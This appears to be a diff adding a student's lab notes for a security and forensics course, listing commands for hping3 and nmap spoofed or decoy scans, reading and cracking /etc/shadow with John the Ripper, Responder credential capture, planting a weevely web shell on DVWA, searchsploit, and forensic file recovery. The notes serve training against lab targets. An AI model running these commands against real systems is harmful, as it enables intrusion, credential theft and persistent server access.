@@ -1,0 +1,156 @@
+csdf lab
+
+1.
+ifconfig()-----use broadcast net id
+route -n>gateway(is the target ip)
+
+sudo hping3 192.168.1.1 -S
+sudo hping3 192.168.1.1 -S --count 3
+sudo hping3 192.168.1.1 -S --count 3 --data 10
+sudo hping3 192.168.1.1 -S --count 3 --data 10 -a 3.2.1.3
+sudo hping3 --scan 1-1024 192.168.1.1 -S
+sudo hping3 -p <one of the open ports> 192.168.1.1 -S
+
+
+sudo hping3 --count 15 192.168.56.1
+sudo hping3 -i 1 192.168.56.1(at intervals)
+sudo hping3 -q 192.168.56.1(without gicing information)
+sudo hping3 --spoof 10.0.2.14 192.168.56.1
+sudo hping3 --traceroute 192.168.56.1
+sudo hping3 --spoof 10.0.2.14 192.168.56.1
+
+
+nmap(ICMP Packets)
+ifconfig>inet
+nmap -sP <network>           
+nmap -sT  <ip>   (use inet)
+nmap -sS  <target>
+nmap -sS -D <fake> <target>                      
+nmap -A <target_ip> 
+nmap -O <target_ip>
+
+
+
+2.
+a.
+webscarab
+browser>settings>netwrok settings>manual proxy>127.0.0.1--port=8008
+search testphp.vulnweb.com>signup 
+
+websacarb>proxy>manual edit>intercept requests
+
+enter username and password
+
+displayed in webscarab
+
+similarly intercept responses
+
+
+b.
+webhttrack
+gui>next>next>add a news url> next>check in system
+
+
+3.
+john --format=raw-sha1 john.txt
+john --incremental john.txt
+john --wordlist=/usr/share/john/password.lst --format=raw-sha1 john.txt
+
+sudo su
+cat /etc/passwd
+cat /etc/shadow
+unshadow /etc/passwd /etc/shadow > temp
+john --format=crypt temp
+
+john --show --format=crypt test.txt
+
+zip --password qwerty checkJohn.zip checkJohn.txt
+zip2john check.zip > zip.hashes
+john zip.hashes
+
+
+crunch
+crunch 1 2
+crunch 1 2 -o temp.txt
+crunch 1 1 123456 -o temp.txt
+crunch 4 6 -p hello world bye
+crunch 2 2 -t @, 
+crunch 2 2 -b 1kb -o START
+4.
+if config eth0 down
+macchanger -p eth0
+macchanger -e eth0
+macchanger -a eth0
+macchanger -r eth0
+macchanger -s eth0
+
+
+responder
+settings>network>NAT to Bridge Adapter
+responder -I eth0----check the system ----- enter code and pwd
+cd /usr/share/responder/logs
+ls
+john <the file>
+
+5.
+attackdefense.pentesteracademy.com >login>dvwa>start>run>Lab Link
+admin and password
+dvwa security>impossible to low 
+
+in terminal
+weevely generate MyPassword admin.php
+
+in website
+file upload>upload admin.php     
+copy link of website
+
+in terminal 
+weevely <url/hackable/uploads/admin.php  MyPassword>
+weevely> system_info
+net_ifconfig
+file_upload <location of a any txt file> <newfile.txt>
+file_rm <newfile.txt>
+file_download <any file on server> <location on system check.png>
+
+
+
+searchsploit
+searchsploit windows oracle
+searchsploit windows oracle -t
+searchsploit windows oracle --exclude="POC"
+searchsploit 44553
+searchsploit 44553 --examine
+searchsploit 44553 -m
+
+
+6.
+fdisk -l
+foremost -v all -i   /dev/sda5 -o recoveredFiles
+rm -r recoveredFiles/
+foremost -v -t <file-type> -i   /dev/sda5 -o recoveredFiles
+
+purplething ctf
+deskel.github link
+copy the link in binwalk
+open link>download
+purple thing ctf iit delhi
+
+eog PurpleThing.jpeg
+binwalk -e PurpleThing.jpeg --run-as=root
+binwalk -D 'image.png' PurpleThing.jpeg --run-as=root
+cd _PurpleThing.jpeg-1.extracted
+ls
+binwalk -W 0.png 25795.png
+binwalk -E PurpleThing.jpeg
+
+7.
+pipal
+search: top 1M passwords hackers rise
+download the xlsx file
+
+pipal -t 15 passwords.txt
+
+
+cutycapt --url="<site>" --out=temp.png
+cutycapt --url="<site>" --out=temp1.pdf
+cutycapt --url="<site>" --out=temp2.png --min-width=400 --min-height=400
